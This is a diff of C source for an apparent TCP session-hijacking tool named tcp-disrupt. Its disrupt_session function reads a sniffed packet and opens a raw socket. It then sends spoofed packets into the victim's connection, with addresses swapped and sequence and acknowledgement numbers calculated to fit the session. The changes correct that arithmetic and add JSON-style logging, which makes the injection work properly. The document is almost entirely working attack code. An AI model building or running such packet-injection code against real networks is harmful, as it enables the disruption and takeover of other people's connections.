@@ -77,24 +77,23 @@ void display_usage(char *name) {
  *
  * Once the function has been hijacked, and the desired actions have been taken on the hijacked session, this function should exit tcp-disrupt. 
  */
-void disrupt_session(void *sniffedPacket) {    
-    struct ip *ipHeader         = (struct ip *)sniffedPacket;
+void disrupt_session(void *sniffedPacket) {
+    struct ip *ipHeader         = (struct ip*)sniffedPacket;
     void *headerPtr             = sniffedPacket + (ipHeader->ip_hl * 4);
     struct tcphdr *tcpHeader    = (struct tcphdr *)headerPtr;
+
     struct sockaddr_in addr_in;
     addr_in.sin_family          = AF_INET;
-    addr_in.sin_port            = ntohs(tcpHeader->source);
-    addr_in.sin_addr.s_addr     = inet_addr(inet_ntoa(ipHeader->ip_src));
-    int sizeOfPacket            = sizeof(struct tcphdr) + sizeof(struct iphdr) + 2;
+    addr_in.sin_port            = tcpHeader->source;
+    inet_pton(AF_INET, inet_ntoa(ipHeader->ip_src), &(addr_in.sin_addr));
+
+    int sizeOfPacket            = sizeof(struct iphdr) + sizeof(struct tcphdr) + 2;
     void *packet                = malloc(sizeOfPacket);
     uint32_t ack_inc            = 1;       // Amount to increase ack by
     uint32_t seq_inc            = 1;       // Amount to increase seq by
     int sock                    = -1;       // Socket FD
     int one                     = 1;        // ??????????????
 
-
-
-    printf("Found ip header with length: %u", (ipHeader->ip_hl) * 5);
     //Raw socket without any protocol-header inside
     if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
         perror("Error while creating socket\n");
@@ -106,21 +105,35 @@ void disrupt_session(void *sniffedPacket) {
         exit(-1);
     }
 
+    printf("\n\nReceived {");
+    printf("\"srcIP\":\"%s\", ",    inet_ntoa(ipHeader->ip_src));
+    printf("\"dstIP\":\"%s\", ",    inet_ntoa(ipHeader->ip_dst));
+    printf("\"dstPort\":%u, ",      ntohs(tcpHeader->dest));
+    printf("\"srcPort\":%u, ",      ntohs(tcpHeader->source));
+    printf("\"SYN\":%d, ",          tcpHeader->syn);
+    printf("\"ACK\":%d, ",          tcpHeader->ack);
+    printf("\"PSH\":%d, ",          tcpHeader->psh);
+    printf("\"RST\":%d, ",          tcpHeader->rst);
+    printf("\"ACK_NUM\":%u, ",      ntohl(tcpHeader->ack_seq));
+    printf("\"SYN_NUM\":%u",        ntohl(tcpHeader->seq));
+    printf("}\n\n");
+
+    printf("Sending {");
+    printf("\"srcIP\":\"%s\", ",    inet_ntoa(ipHeader->ip_dst));
+    printf("\"dstIP\":\"%s\", ",    inet_ntoa(ipHeader->ip_src));
+    printf("\"dstPort\":%u, ",      ntohs(tcpHeader->source));
+    printf("\"srcPort\":%u, ",      ntohs(tcpHeader->dest));
+    printf("\"SYN\":%d, ",          SYN_OFF);
+    printf("\"ACK\":%d, ",          ACK_ON);
+    printf("\"PSH\":%d, ",          PSH_ON);
+    printf("\"RST\":%d, ",          RESET_OFF);
+    printf("\"ACK_NUM\":%u, ",      ntohl(tcpHeader->seq) + seq_inc);
+    printf("\"SYN_NUM\":%u, ",      ntohl(tcpHeader->ack_seq) + ack_inc);
+    printf("\"data\":\"%s\"",       "X");
+    printf("}\n\n");
+
     int packetCountdown = 5;
     while(packetCountdown--){
-        printf("Sending {");
-        printf("\"srcIP\":\"%s\", ",    inet_ntoa(ipHeader->ip_src));
-        printf("\"dstIP\":\"%s\", ",    inet_ntoa(ipHeader->ip_dst));
-        printf("\"dstPort\":%u, ",      ntohs(tcpHeader->dest));
-        printf("\"srcPort\":%u, ",      ntohs(tcpHeader->source));
-        printf("\"SYN\":%d, ",          SYN_OFF);
-        printf("\"ACK\":%d, ",          ACK_ON);
-        printf("\"RST\":%d, ",          RESET_OFF);
-        printf("\"ACK_NUM\":%u, ",      ntohl(tcpHeader->ack_seq) + ack_inc);
-        printf("\"SYN_NUM\":%u, ",      ntohl(tcpHeader->seq) + seq_inc);
-        printf("\"data\":\"%s\"",       "X");
-        printf("}");
-
         fill_packet(inet_ntoa(ipHeader->ip_dst),            // Source IP Address
                     inet_ntoa(ipHeader->ip_src),            // Destination IP Address
                     ntohs(tcpHeader->source),               // Destination Port
@@ -128,14 +141,14 @@ void disrupt_session(void *sniffedPacket) {
                     SYN_OFF,                                // SYN Flag
                     ACK_ON,                                 // ACK Flag
                     PSH_ON,                                 // PSH Flag
-                    ntohl(tcpHeader->seq) + ack_inc,        // Sequence Number
-                    ntohl(tcpHeader->ack_seq) + seq_inc,    // Acknowledgement Number
+                    ntohl(tcpHeader->ack_seq) + seq_inc,    // Sequence Number
+                    ntohl(tcpHeader->seq) + ack_inc,        // Acknowledgement Number
                     RESET_OFF,                              // RST Flag
                     "X",                                    // Data
                     packet,                                 // Packet to fill
                     sizeOfPacket);                          // Total size of packet
 
         // Send out the packet
-        printf("Sending Packet %02d of %02d! Result: %d\n", 49-packetCountdown, 50, send_packet(sock, packet, addr_in));
+        printf("Sending Packet %02d of %02d! Result: %d\n", 6-packetCountdown, 5, send_packet(sock, packet, addr_in));
     }
 }
